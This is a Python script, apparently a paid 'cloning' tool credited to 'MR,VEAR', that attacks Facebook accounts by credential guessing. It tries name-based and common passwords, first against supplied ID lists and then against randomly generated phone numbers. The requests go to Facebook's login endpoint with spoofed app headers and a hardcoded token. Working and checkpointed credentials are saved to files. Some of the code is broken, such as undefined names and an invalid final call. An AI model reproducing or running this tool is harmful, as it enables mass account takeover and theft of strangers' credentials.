#SOURCE BY MR,VEAR
#GITHUB : NOT

import os,base64,zlib,pip,urllib, subprocess,time,string
import  platform
os.system("pip install bs4 rich")
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system("clear")
import os,base64,zlib,pip,urllib,subprocess, requests, random, uuid, string, hashlib, json
try:
		import os,requests,json,time,re,random,sys,uuid,string,subprocess
		from string import *
		from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
		print('\n Installing missing modules ...')
		os.system('pip install requests futures==2 > /dev/null')
		os.system('python V11.py')
except:pass
try:
	import requests
	import device 
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python V11.py')

loop = 0
oks = []
cps = []
tf = []
tl = []
ok = []
cp = []
cpss = []
apps = []
cok =[]
ses=requests.Session()
def clear():
	os.system("clear")
logo =                                          ("""   
\33[1;31m, ＜￣｀ヽ、　　　　　　／￣＞
\33[1;32m　ゝ、　　＼　／⌒ヽ,ノ 　/´
\33[1;33m　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
\33[1;34m　　 　　> MR,VEAR ,)
　\33[1;35m　　　　∠_,,,/
 MR,VEAR
\033[1;33m==========================================
 \033[1;37m  TOOL BY   :  PAID
\033[1;37m   TEAM         :  MR,VEAR
   TOOL VIRSION :  13.8
\033[1;33m==========================================\033[1;37m\n""")

def linex():
	print('\033[1;33m==========================================\033[1;37m')

def channal():
	clear()
	print(logo)
	print('  [\033[1;32m1\033[1;37m] Subscribe My YouTube Channal')
	print('  [\033[1;32m2\033[1;37m] Exit')
	linex()
	aaa=input('\n  \033[1;37mChoose Option :\033[1;32m ')
	if aaa =='1':
		os.system('xdg-open https://www.facebook.com/vear.ahmad.545?mibextid=ZbWKwL');time.sleep(3);kas()
	elif aaa =='2':
		exit()

def file_crack():
	global ok,cp,tf
	os.system('clear')
	opt_method = ('1')
	os.system('clear')
	print(logo)
	print('  [\033[1;32m•\033[1;37m] Example : /sdcard/MR,VEAR.txt')
	file = input('\n  Put file path : \033[1;32m')
	linex()
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(' Path Maybe Wrong ...')
		time.sleep(1)
		file_crack()
	plist = []
	try:
		clear()
		print(logo)
		ps_limit = int(input(' How many passwords do you want to add ? \033[1;32m')) #KRS
	except:
		ps_limit =1
	clear()
	print(logo)
	print(' Exp : first last,firtslast,first123')
	print('\033[1;33m==========================================\n')
	
	for i in range(ps_limit):
		plist.append(input(f'\033[1;37m  Put password {i+1} : \033[1;32m'))
	with ThreadPool(max_workers=30) as crack_submit:
		os.system('clear')
		print(logo)
		time.sleep(2)
		total_ids = str(len(fo))
		print('  [\033[1;32m+\033[1;37m] Total IDs :\033[1;32m '+total_ids)
		print("  [\033[1;32m+\033[1;37m] Use Flight Mode In Every 3 min")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if opt_method =='1':
				crack_submit.submit(file_method,ids,names,passlist,total_ids)
			else:
				crack_submit.submit(file_method,ids,names,passlist,total_ids)
	linex()
	print(' The process has completed')
	print(' Total OK/CP:\033[1;32m '+str(len(ok))+'/\033[1;37m'+str(len(cp)))
	input('\n Press enter to back ')
	kas()

def kas():
			clear()
			print(logo)
			print('  [\033[1;32m1\033[1;37m] FILE CLONING')
			print('  [\033[1;32m2\033[1;37m] RANDOM CLONING')
			print('  [\033[1;32m3\033[1;37m] JOIN OUR FB GROUP')
			print('  [\033[1;32m0\033[1;37m] Exit \n')
			linex()
			xd=input(' Choose an option: \033[1;32m')
			if xd in ['1','01']:
				file_crack()
			elif xd in ['2','02']:
				random1()
			elif xd in ['3','03']:
				os.system('xdg-open https://www.facebook.com/groups/207678473842318')
			elif xd in ['0','00']:
				exit()
			else:
				print(' Option not found...');kas()



def random1():
				user=[]
				os.system('clear') 
				print(logo)
				print('  [\033[1;32m•\033[1;37m] Example : 0301,0318,0333,0345 Etc')
				print('  [\033[1;32m•\033[1;37m] See note : Use Your Country Code ')
				linex()
				code = input(' put code : \033[1;32m ')
				try:
						limit = int(input(' \033[1;37mput limit : \033[1;32m'))
				except ValueError:
						limit = 5000
				for nmbr in range(limit):
						nmp = ''.join(random.choice(string.digits) for _ in range(7))
						user.append(nmp)
				with tred(max_workers=30) as KRSS:	 
						os.system('clear')
						tl = str(len(user))
						print(logo)
						print('  [\033[1;32m+\033[1;37m] Total Account :\033[1;32m '+tl)
						print(f' \033[1;37m [\033[1;32m+\033[1;37m] Choice Code .. :\033[1;32m '+code)
						print(" \033[1;37m [\033[1;32m+\033[1;37m] Use Flight Mode In Every 3 min")
						linex()
						for psx in user:
								ids = code+psx
								passlist = [psx,ids,'khankhan','khan1122','baloch','baloch123','afghan123','freefire','pubg123','pak123','khan123','kingkhan']
								KRSS.submit(RANDOM,ids,passlist)
							
				print('')
				linex()
				print(' The Process Has Completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press Enter To Back ')
				kas()




def file_method(ids,names,passlist,total_ids):
	global loop,ok,cp,tf
	sys.stdout.write('\r\033[1;37m  [MR,VEAR] %s/%s OK/CP/2F : %s/%s\r'%(loop,total_ids,len(ok),len(cp)));sys.stdout.flush()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			
			ua = "[FBAN/FB4A;FBAV/65.0.0.4421;FBBV/3596007;[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
			data={'adid': 'c339c5Cdb4EDcEc3', 'format': 'json', 'device_id': '153f8aea-3705-40e7-95be-be68ab71fce9', 'cpl': 'true', 'family_device_id': 'a9cf89db-e313-4db4-9eaf-4aad0742fd21', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', 'currently_logged_in_userid': '0', 'locale': 'fa_AF', 'client_country_code': 'AF', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
			headers= {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}
			url = 'https://b-graph.facebook.com/auth/login'
			po = requests.post(url,data=data,headers=headers).json()
			if 'access_token' in po:
				print('  \033[1;32m[MR,VEAR-OK] '+ids+' | '+pas+           '\033[0;97m')
				ok.append(ids)
				open('/sdcard/MR,VEAR-OK.txt','a').write(ids+' | '+pas+'\n')
				open('MR,VEAR-OK.txt','a').write(str(uid)+'|'+pas+'\n')
				break
			elif "session_key" in po:
				print(' \033[1;32m [MR,VEAR-OK] '+ids+' | '+pas+           '\033[0;97m')
				ok.append(ids)
				open('/sdcard/MR,VEAR-OK.txt','a').write(ids+' || '+pas+'\n')
				break
			elif 'www.facebook.com' in str(po):
				print(' \033[1;37m [MR,VEAR-CP] '+ids+' | '+pas+            '\033[0;97m')
				cp.append(ids)
				open('/sdcard/MR,VEAR-CP.txt','a').write(ids+' | '+pas+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
		passo




def RANDOM(ids,passlist):
		global loop
		global oks
		global tl
		sys.stdout.write('\r  \033[1;37m[MR,VEAR] [ %s ]  OK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
		try:
				for pas in passlist:
						
						ua = "[FBAN/FB4A;FBAV/65.0.0.4421;FBBV/3596007;[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
						data={'adid': 'c339c5Cdb4EDcEc3', 'format': 'json', 'device_id': '153f8aea-3705-40e7-95be-be68ab71fce9', 'cpl': 'true', 'family_device_id': 'a9cf89db-e313-4db4-9eaf-4aad0742fd21', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', 'currently_logged_in_userid': '0', 'locale': 'fa_AF', 'client_country_code': 'AF', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
						headers= {
	"path": '/',
    "scheme": 'https',
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2102J20SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
						url = 'https://b-graph.facebook.com/auth/login'
						twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
						tu = 'checkpoint/828281030927956/?next=https%3A%2F%2Fweb.facebook.com%2F'
						po = requests.post(url,data=data,headers=headers).json()
						if 'session_key' in po:
								try:
										uid = po['uid']
								except:
										uid = ids
								if str(uid) in oks:
										break
								else:
										print('\033[1;32m  [MR,VEAR-OK] '+str(uid)+' | '+pas+             '')
										
										open('/sdcard/MR,VEAR-OK.txt','a').write(str(uid)+'|'+pas+'\n')
										open('MR,VEAR-OK.txt','a').write(str(uid)+'|'+pas+'\n')
										oks.append(str(uid))
										break
						elif 'temporarily unavailable' in po['error']['message']:
								try:
										uid = po['error']['error_data']['uid']
								except:
										uid = ids
								if uid in oks:pass
								else:
										print(' \033[1;37m [MR,VEAR-CP] '+str(uid)+' | '+pas+         '')
										open('/sdcard/MR,VEAR-CP.txt','a').write(str(uid)+'|'+pas+'\n')
										cps.append(str(ids))
										break
						else:continue
				loop+=1
		except Exception as e:
				pass


MR,VEAR()
